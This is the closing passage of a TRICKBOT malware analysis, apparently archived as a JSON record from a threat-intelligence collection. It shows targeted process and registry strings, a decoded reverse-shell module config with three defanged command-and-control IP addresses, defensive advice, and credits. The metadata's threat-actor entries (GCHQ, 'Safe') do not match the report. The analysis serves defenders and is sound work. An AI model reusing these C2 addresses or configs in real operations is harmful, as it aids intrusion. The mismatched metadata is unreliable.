|more\"\n\"SysListView32\"\n\"IE.HTTP\\\\shell\\\\open\\\\command\"\n\"EDGE\\\\shell\\\\open\\\\command\"\n\"\\\\shell\\\\open\\\\command\"\n\"ChromeHTML\"\n\"FirefoxHTML\"\n\"\\\\mmc.exe\"\n\"\\\\cmd.exe\"\n\"\\\\explorer.exe\"\n\"\\\\Microsoft Office\\\\Office16\\\\outlook.exe\"\n\"\\\\Microsoft Office\\\\Office15\\\\outlook.exe\"\n\"\\\\Microsoft Office\\\\Office14\\\\outlook.exe\"\n\"\\\\Microsoft Office\\\\Office12\\\\outlook.exe\"\n\"\\\\Microsoft Office\\\\Office11\\\\outlook.exe\"\n\n## newBCtestDll64\n\n#### OSINT reports as reverse shell. Will confirm later with network traffic/PCAP analysis.\n<moduleconfig><autostart>yes</autostart><sys>yes</sys><needinfo name = \"id\"/><needinfo\nname = \"ip\"/><autoconf><conf ctl = \"setconf\" file = \"bcconfig\" period = \"90\"/></autoconf>\n</moduleconfig>\n\n decoded config C:\\Users*\\AppData\\Roaming\\gpuDriver\\Data\\NewBCtestDll64_configs\n<servers>\n<addr>162[.]209[.]124[.]166:80</addr>\n<addr>167[.]99[.]206[.]127:80</addr>\n<addr>199[.]247[.]24[.]9:80</addr>\n </servers>\n\n## Conclusion:\n\n#### Very quickly you can gather IOCs and some basic understanding of the malware. Obviously further analysis on network traffic and stepping through the unpacking of the malware will result in any missed bits of information but requires reverse engineer lv.2 ü•áü•á\n\n```\n\n-----\n\n#### TRICKBOT can be a real pain and while doing this research it was even in the US news - taking a school offline. If you do detect a TRICKBOT infection in your environment, the likely hood is with, you have an EMOTET problem too - so one to be aware of and check that out.\n\n Trickbot normally has its own malspam-based distribution channel, but now Trickbot attackers are also using Emotet for their infections. https://unit42.paloaltonetworks.com/unit42-malware-team-malspam-pushing-emotet- trickbot/\n\n 2019-05-16 - #Emotet still doing #Trickbot as the follow-up malware this week, it seems. pic.twitter.com/Ozay0p1MhS\n\n ‚Äî Brad (@malware_traffic) May 16, 2019\n\n With the rate of modules being developed by TRICKBOT, understanding the impact it can have on your environment is key for defense. Hopefully this helped you understand the threat TRICKBOT imposes and has spurred you on to look in these various areas to proactively harden what 'TRICK' is looking for to ultimately steal. With the added 'access-as-a-service' which criminal groups are providing nowdays, your TRICK infection might turn into something else. TBC üôàüôàüôà\n\n## Configs/IOCs\n\n#### https://pastebin.com/wZ3R0gCa\n https://pastebin.com/ghGtMBLH\n\n## Further Analysis:\n\n#### Network lateral movement analysis (SMB/IPC/EternalBlue/Champion) Create a script to loop through the modules, decode, complete string analysis and automatically report back diffs. Network IOCs / PCAP traffic of infection - @malware_traffic does a great job of this already. Late to the game with this but this looks gold! Unpacking the main config, Open Analysis Live - https://www.youtube.com/watch?v=EdchPEHnohw\n\n Happy to hear any further information I've missed or is key for defenders üòé.\n\n### Credits:\n\n#### @hasherades great Youtube content aswell as the decrypting scripts used üëèüëèüëè MS-ISAC TRICKBOT Primer March 2019 https://www.cisecurity.org/wp- content/uploads/2019/03/MS-ISAC-Security-Primer-Trickbot-11March2019-mtw.pdf @malware_traffic 2019-04-27 TRICKBOT SAMPLE @VK_intel for his blog - https://www.vkremez.com/2017/09/lets-learn-reversing-trickbot- banking.html\n\n\n-----\n\n#### @felixw3000 s analysis https://www.uperesia.com/how-trickbot-tricks-its-victims\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-05-22 - TRICKBOT - Analysis.pdf"
    ],
    "report_names": [
        "2019-05-22 - TRICKBOT - Analysis.pdf"
    ],
    "threat_actors": [
        {
            "id": "5d2bd376-fcdc-4c6a-bc2c-17ebbb5b81a4",
            "created_at": "2022-10-25T16:07:23.667223Z",
            "updated_at": "2025-03-27T02:02:09.916086Z",
            "deleted_at": null,
            "main_name": "GCHQ",
            "aliases": [
                "Government Communications Headquarters",
                "Operation Socialist"
            ],
            "source_name": "ETDA:GCHQ",
            "tools": [
                "Prax",
                "Regin",
                "WarriorPride"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535627,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1653752484,
    "ts_modification_date": 1653752484,
    "files": {
        "pdf": "https://archive.orkl.eu/9850a8bbaab8ed95fecde146554a684176d713fc.pdf",
        "text": "https://archive.orkl.eu/9850a8bbaab8ed95fecde146554a684176d713fc.txt",
        "img": "https://archive.orkl.eu/9850a8bbaab8ed95fecde146554a684176d713fc.jpg"
    }
}